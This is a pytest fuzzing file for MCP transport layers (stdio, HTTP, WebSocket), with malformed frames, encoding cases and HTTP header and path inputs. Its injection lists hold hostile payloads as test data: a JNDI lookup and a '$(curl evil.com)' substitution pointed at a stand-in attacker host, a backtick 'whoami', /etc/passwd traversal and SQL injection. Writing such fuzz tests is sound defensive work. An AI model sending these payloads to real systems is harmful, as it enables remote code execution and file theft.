"""
MCP Transport Layer Fuzzing Tests

Comprehensive fuzzing tests for MCP transport layer implementations including
stdio, HTTP, and WebSocket transports. Tests protocol compliance, error handling,
and security vulnerabilities.

Test Coverage:
- Message framing fuzzing
- Binary data handling
- Malformed protocol data
- Header injection attacks
- Message size limits
- Connection handling
- Protocol upgrade fuzzing
- Encoding/decoding errors
- Network error simulation
- Timeout handling
"""

import asyncio
import pytest
import json
import random
import string
from typing import Dict, Any, List, Optional
from io import BytesIO, StringIO

# Import for testing
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../src'))


# ============================================================================
# Transport Fuzzing Utilities
# ============================================================================

class TransportFuzzer:
    """Fuzzer for transport layer data"""

    @staticmethod
    def malformed_json_frames() -> List[bytes]:
        """Generate malformed JSON frames"""
        return [
            b'',  # Empty
            b'{',  # Incomplete
            b'}',  # Unmatched
            b'{"key": }',  # Missing value
            b'{"key" "value"}',  # Missing colon
            b'{key: "value"}',  # Unquoted key
            b'{"key": "value",}',  # Trailing comma
            b'null',  # Valid JSON but not object
            b'[]',  # Array
            b'123',  # Number
            b'"string"',  # String
            b'true',  # Boolean
            b'{' + b'A' * 1000000 + b'}',  # Huge message
            b'\x00\x01\x02\x03',  # Binary data
            b'\xff\xfe',  # Invalid UTF-8
            b'{"key": "\x00"}',  # Null byte in string
        ]

    @staticmethod
    def oversized_frames() -> List[bytes]:
        """Generate oversized message frames"""
        return [
            b'{"data": "' + b'A' * (1024 * 1024) + b'"}',  # 1MB
            b'{"data": "' + b'A' * (10 * 1024 * 1024) + b'"}',  # 10MB
            b'{"data": [' + b'1,' * 100000 + b'1]}',  # Large array
        ]

    @staticmethod
    def special_byte_sequences() -> List[bytes]:
        """Generate special byte sequences"""
        return [
            b'\x00',  # Null byte
            b'\r\n',  # CRLF
            b'\n',  # LF
            b'\r',  # CR
            b'\t',  # Tab
            b'\x1a',  # Ctrl-Z (EOF)
            b'\x04',  # Ctrl-D (EOF)
            b'\x1b',  # ESC
            b'\x7f',  # DEL
            b'\xff' * 100,  # Invalid UTF-8
            bytes(range(256)),  # All bytes
        ]

    @staticmethod
    def http_header_injection() -> List[str]:
        """HTTP header injection patterns"""
        return [
            "Host: evil.com",
            "Host: example.com\r\nX-Injected: true",
            "Host: example.com\nX-Injected: true",
            "Host: example.com\r\n\r\n<html>",
            "Host: example.com%0d%0aX-Injected: true",
            "../../../etc/passwd",
            "Host: ${jndi:ldap://evil.com/a}",
            "Host: `whoami`",
            "Host: $(curl evil.com)",
        ]

    @staticmethod
    def websocket_frames() -> List[bytes]:
        """Malformed WebSocket frame data"""
        return [
            b'\x81\x00',  # Empty text frame
            b'\x82\x00',  # Empty binary frame
            b'\x88\x00',  # Close frame
            b'\x89\x00',  # Ping frame
            b'\x8a\x00',  # Pong frame
            b'\x81\x7e\x00\x00',  # 16-bit length = 0
            b'\x81\x7f' + b'\x00' * 8,  # 64-bit length = 0
            b'\xff' * 100,  # Invalid frames
            b'\x00' * 100,  # Null bytes
        ]

    @staticmethod
    def content_length_attacks() -> List[tuple]:
        """Content-Length header attack patterns"""
        return [
            ("0", "{}"),  # Mismatch
            ("-1", "{}"),  # Negative
            ("999999999", "{}"),  # Huge size
            ("abc", "{}"),  # Non-numeric
            ("10\r\n20", "{}"),  # Header injection
        ]

    @staticmethod
    def encoding_variations() -> List[str]:
        """Different encoding variations"""
        return [
            "utf-8",
            "utf-16",
            "utf-32",
            "latin-1",
            "ascii",
            "iso-8859-1",
            "invalid-encoding",
        ]


class MockTransportHelper:
    """Helper for mocking transport operations"""

    @staticmethod
    def create_stdio_mock():
        """Create mock stdio transport"""
        input_buffer = BytesIO()
        output_buffer = BytesIO()
        return input_buffer, output_buffer

    @staticmethod
    def create_http_request(
        method: str = "POST",
        path: str = "/",
        headers: Dict[str, str] = None,
        body: bytes = b"",
    ) -> bytes:
        """Create mock HTTP request"""
        if headers is None:
            headers = {}

        request_line = f"{method} {path} HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        request = f"{request_line}{header_lines}\r\n\r\n".encode() + body

        return request


# ============================================================================
# Stdio Transport Fuzzing Tests
# ============================================================================

class TestStdioTransportFuzzing:
    """Test stdio transport with fuzzed inputs"""

    def test_fuzz_message_framing(self):
        """Test message framing with malformed data"""
        for frame in TransportFuzzer.malformed_json_frames():
            input_buffer = BytesIO(frame + b'\n')
            output_buffer = BytesIO()

            # Attempt to read and parse
            try:
                line = input_buffer.readline()
                if line:
                    # Try to parse as JSON
                    try:
                        data = json.loads(line.decode('utf-8', errors='ignore'))
                        # If it parses, should be dict or list
                        assert isinstance(data, (dict, list, type(None), bool, int, float, str))
                    except (json.JSONDecodeError, UnicodeDecodeError):
                        # Expected for malformed data
                        pass
            except Exception as e:
                # Should not crash with unhandled exceptions
                assert isinstance(e, (ValueError, TypeError, UnicodeError))

    def test_fuzz_line_endings(self):
        """Test different line ending variations"""
        message = {"jsonrpc": "2.0", "method": "ping", "id": 1}
        message_json = json.dumps(message)

        line_endings = [
            b'\n',  # LF (Unix)
            b'\r\n',  # CRLF (Windows)
            b'\r',  # CR (Old Mac)
            b'',  # No ending
            b'\n\n',  # Double LF
            b'\r\n\r\n',  # Double CRLF
        ]

        for ending in line_endings:
            frame = message_json.encode() + ending
            input_buffer = BytesIO(frame)

            try:
                line = input_buffer.readline()
                if line:
                    # Strip and parse
                    line_clean = line.strip()
                    if line_clean:
                        data = json.loads(line_clean)
                        assert data.get("method") == "ping"
            except Exception:
                # Some endings might cause issues, which is acceptable
                pass

    def test_fuzz_binary_data(self):
        """Test binary data in stdio transport"""
        for binary_seq in TransportFuzzer.special_byte_sequences():
            input_buffer = BytesIO(binary_seq + b'\n')

            try:
                line = input_buffer.readline()
                # Attempt to decode
                text = line.decode('utf-8', errors='ignore')
                # Should not crash
                assert isinstance(text, str)
            except Exception as e:
                # Binary data may cause decode errors
                assert isinstance(e, (UnicodeDecodeError, ValueError))

    def test_fuzz_oversized_messages(self):
        """Test handling of oversized messages"""
        for frame in TransportFuzzer.oversized_frames()[:2]:  # Limit to avoid memory issues
            input_buffer = BytesIO(frame + b'\n')

            try:
                # Read with size limit
                MAX_SIZE = 1024 * 1024  # 1MB limit
                line = input_buffer.readline(MAX_SIZE)

                # Should either truncate or handle gracefully
                assert len(line) <= MAX_SIZE or len(line) > 0
            except Exception as e:
                # May raise memory or size errors
                assert isinstance(e, (MemoryError, ValueError))

    def test_fuzz_concurrent_stdio_operations(self):
        """Test concurrent stdio read/write operations"""
        input_buffer = BytesIO()
        output_buffer = BytesIO()

        # Simulate concurrent writes
        messages = [
            {"jsonrpc": "2.0", "method": "ping", "id": i}
            for i in range(100)
        ]

        for msg in messages:
            frame = (json.dumps(msg) + '\n').encode()
            output_buffer.write(frame)

        # Read back
        output_buffer.seek(0)
        count = 0
        while True:
            line = output_buffer.readline()
            if not line:
                break
            try:
                data = json.loads(line)
                assert data.get("jsonrpc") == "2.0"
                count += 1
            except Exception:
                pass

        assert count == len(messages)


# ============================================================================
# HTTP Transport Fuzzing Tests
# ============================================================================

class TestHTTPTransportFuzzing:
    """Test HTTP transport with fuzzed inputs"""

    def test_fuzz_http_method(self):
        """Fuzz HTTP method field"""
        methods = [
            "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS",
            "TRACE", "CONNECT",  # Valid but unusual
            "INVALID", "HACK", "ATTACK",  # Invalid
            "GET\r\nX-Injected: true",  # Injection attempt
            "A" * 1000,  # Long method
            "",  # Empty
            "GE\x00T",  # Null byte
        ]

        for method in methods:
            try:
                request = MockTransportHelper.create_http_request(
                    method=method,
                    headers={"Content-Type": "application/json"},
                    body=b'{"jsonrpc":"2.0","method":"ping","id":1}',
                )
                # Should create without crashing
                assert isinstance(request, bytes)
            except Exception as e:
                # Invalid methods may cause errors
                assert isinstance(e, (ValueError, TypeError))

    def test_fuzz_http_headers(self):
        """Fuzz HTTP headers"""
        header_values = TransportFuzzer.http_header_injection()

        for value in header_values:
            try:
                headers = {
                    "Host": value,
                    "Content-Type": "application/json",
                }
                request = MockTransportHelper.create_http_request(
                    headers=headers,
                    body=b'{}',
                )
                # Should handle without crashing
                assert isinstance(request, bytes)
            except Exception:
                # Some injections might be caught
                pass

    def test_fuzz_content_length(self):
        """Fuzz Content-Length header"""
        for length_value, body in TransportFuzzer.content_length_attacks():
            try:
                headers = {
                    "Content-Length": length_value,
                    "Content-Type": "application/json",
                }
                request = MockTransportHelper.create_http_request(
                    headers=headers,
                    body=body.encode(),
                )
                # Should handle mismatches
                assert isinstance(request, bytes)
            except Exception:
                pass

    def test_fuzz_http_path(self):
        """Fuzz HTTP request path"""
        paths = [
            "/",  # Valid
            "/api/mcp",  # Valid
            "/../../../etc/passwd",  # Path traversal
            "/api/mcp?query=';DROP TABLE users--",  # SQL injection
            "/api/mcp%00.txt",  # Null byte
            "/" + "A" * 10000,  # Long path
            "/api/mcp\r\nX-Injected: true",  # Header injection
            "",  # Empty
            "//multiple//slashes//",  # Multiple slashes
        ]

        for path in paths:
            try:
                request = MockTransportHelper.create_http_request(
                    path=path,
                    headers={"Content-Type": "application/json"},
                    body=b'{}',
                )
                assert isinstance(request, bytes)
            except Exception:
                pass

    def test_fuzz_http_body(self):
        """Fuzz HTTP request body"""
        bodies = TransportFuzzer.malformed_json_frames()

        for body in bodies[:10]:  # Sample to avoid slowness
            try:
                headers = {
                    "Content-Type": "application/json",
                    "Content-Length": str(len(body)),
                }
                request = MockTransportHelper.create_http_request(
                    headers=headers,
                    body=body,
                )
                assert isinstance(request, bytes)
            except Exception:
                pass

    def test_fuzz_content_type(self):
        """Fuzz Content-Type header"""
        content_types = [
            "application/json",  # Valid
            "application/json; charset=utf-8",  # Valid with charset
            "text/plain",  # Wrong type
            "application/xml",  # Wrong type
            "multipart/form-data",  # Wrong type
            "",  # Empty
            "application/json\r\nX-Injected: true",  # Injection
            "A" * 1000,  # Long value
            "application/json; charset=invalid",  # Invalid charset
        ]

        for ct in content_types:
            try:
                headers = {
                    "Content-Type": ct,
                }
                request = MockTransportHelper.create_http_request(
                    headers=headers,
                    body=b'{"jsonrpc":"2.0","method":"ping","id":1}',
                )
                assert isinstance(request, bytes)
            except Exception:
                pass


# ============================================================================
# WebSocket Transport Fuzzing Tests
# ============================================================================

class TestWebSocketTransportFuzzing:
    """Test WebSocket transport with fuzzed inputs"""

    def test_fuzz_websocket_frames(self):
        """Fuzz WebSocket frame structure"""
        for frame in TransportFuzzer.websocket_frames():
            # Attempt to parse frame structure
            try:
                if len(frame) >= 2:
                    fin = (frame[0] & 0x80) != 0
                    opcode = frame[0] & 0x0F
                    masked = (frame[1] & 0x80) != 0
                    payload_len = frame[1] & 0x7F

                    # Should parse without crashing
                    assert isinstance(fin, bool)
                    assert 0 <= opcode <= 15
                    assert isinstance(masked, bool)
                    assert 0 <= payload_len <= 127
            except (IndexError, ValueError):
                # Invalid frames may cause errors
                pass

    def test_fuzz_websocket_masking(self):
        """Test WebSocket masking key fuzzing"""
        # Valid text frame structure
        base_frame = bytearray([0x81, 0x80])  # FIN=1, opcode=text, masked=1, len=0

        # Fuzz masking keys
        for _ in range(10):
            masking_key = bytes([random.randint(0, 255) for _ in range(4)])
            frame = base_frame + masking_key

            try:
                # Parse masking key
                if len(frame) >= 6:
                    key = frame[2:6]
                    assert len(key) == 4
            except Exception:
                pass

    def test_fuzz_websocket_payload_length(self):
        """Fuzz WebSocket payload length encoding"""
        lengths = [
            0,  # Zero length
            125,  # Max 7-bit length
            126,  # Requires 16-bit length
            127,  # Requires 64-bit length
            65535,  # Max 16-bit
            65536,  # Requires 64-bit
            0xFFFFFFFF,  # Large 32-bit
        ]

        for length in lengths[:5]:  # Limit for speed
            try:
                # Encode length
                if length <= 125:
                    frame = bytes([0x81, length])
                elif length <= 65535:
                    frame = bytes([0x81, 126]) + length.to_bytes(2, 'big')
                else:
                    frame = bytes([0x81, 127]) + length.to_bytes(8, 'big')

                # Should create valid frame structure
                assert len(frame) >= 2
            except Exception:
                pass

    def test_fuzz_websocket_opcodes(self):
        """Fuzz WebSocket opcode field"""
        opcodes = [
            0x0,  # Continuation
            0x1,  # Text
            0x2,  # Binary
            0x8,  # Close
            0x9,  # Ping
            0xA,  # Pong
            0x3, 0x4, 0x5, 0x6, 0x7,  # Reserved
            0xB, 0xC, 0xD, 0xE, 0xF,  # Reserved control
        ]

        for opcode in opcodes:
            frame = bytes([0x80 | opcode, 0x00])  # FIN=1, payload=0
            try:
                # Parse opcode
                parsed_opcode = frame[0] & 0x0F
                assert parsed_opcode == opcode
            except Exception:
                pass


# ============================================================================
# Protocol Upgrade Fuzzing Tests
# ============================================================================

class TestProtocolUpgradeFuzzing:
    """Test protocol upgrade mechanisms"""

    def test_fuzz_websocket_upgrade_headers(self):
        """Fuzz WebSocket upgrade request headers"""
        upgrade_variations = [
            {"Upgrade": "websocket", "Connection": "Upgrade"},  # Valid
            {"Upgrade": "WebSocket", "Connection": "Upgrade"},  # Case variation
            {"Upgrade": "websocket"},  # Missing Connection
            {"Connection": "Upgrade"},  # Missing Upgrade
            {"Upgrade": "http/2.0"},  # Wrong protocol
            {"Upgrade": "websocket\r\nX-Injected: true"},  # Injection
            {},  # Missing both
        ]

        for headers in upgrade_variations:
            try:
                request = MockTransportHelper.create_http_request(
                    method="GET",
                    path="/",
                    headers={
                        **headers,
                        "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                        "Sec-WebSocket-Version": "13",
                    },
                )
                assert isinstance(request, bytes)
            except Exception:
                pass

    def test_fuzz_websocket_key(self):
        """Fuzz Sec-WebSocket-Key header"""
        keys = [
            "dGhlIHNhbXBsZSBub25jZQ==",  # Valid
            "",  # Empty
            "invalid",  # Invalid base64
            "A" * 1000,  # Long key
            "key\r\nX-Injected: true",  # Injection
            None,  # Missing
        ]

        for key in keys:
            try:
                headers = {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Sec-WebSocket-Version": "13",
                }
                if key is not None:
                    headers["Sec-WebSocket-Key"] = key

                request = MockTransportHelper.create_http_request(
                    method="GET",
                    headers=headers,
                )
                assert isinstance(request, bytes)
            except Exception:
                pass


# ============================================================================
# Encoding/Decoding Fuzzing Tests
# ============================================================================

class TestEncodingFuzzing:
    """Test encoding and decoding fuzzing"""

    def test_fuzz_character_encodings(self):
        """Test different character encodings"""
        message = {"jsonrpc": "2.0", "method": "ping", "id": 1}
        message_str = json.dumps(message)

        for encoding in TransportFuzzer.encoding_variations():
            try:
                # Encode with specified encoding
                if encoding in ["utf-8", "utf-16", "utf-32", "latin-1", "ascii", "iso-8859-1"]:
                    encoded = message_str.encode(encoding)
                    # Decode back
                    decoded = encoded.decode(encoding)
                    # Should match or be close
                    assert "jsonrpc" in decoded
            except (UnicodeEncodeError, UnicodeDecodeError, LookupError):
                # Invalid encodings or incompatible characters
                pass

    def test_fuzz_encoding_errors(self):
        """Test encoding error handling"""
        # Invalid UTF-8 sequences
        invalid_utf8 = [
            b'\xff\xfe',
            b'\x80\x80',
            b'\xc0\x80',
            b'\xf5\x80\x80\x80',
        ]

        for invalid_bytes in invalid_utf8:
            try:
                # Try to decode
                text = invalid_bytes.decode('utf-8', errors='ignore')
                # Should handle gracefully
                assert isinstance(text, str)
            except UnicodeDecodeError:
                # Expected for truly invalid sequences
                pass

    def test_fuzz_json_encoding(self):
        """Test JSON encoding with special characters"""
        special_chars = [
            "\x00",  # Null
            "\n",  # Newline
            "\r",  # CR
            "\t",  # Tab
            "\\",  # Backslash
            '"',  # Quote
            "\u0000",  # Unicode null
            "\uffff",  # Max BMP
            "🔥",  # Emoji
        ]

        for char in special_chars:
            try:
                message = {"jsonrpc": "2.0", "data": char, "id": 1}
                # Encode to JSON
                encoded = json.dumps(message)
                # Decode back
                decoded = json.loads(encoded)
                # Character should be preserved (or escaped)
                assert "data" in decoded
            except (json.JSONEncodeError, json.JSONDecodeError):
                # Some characters might not be supported
                pass


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
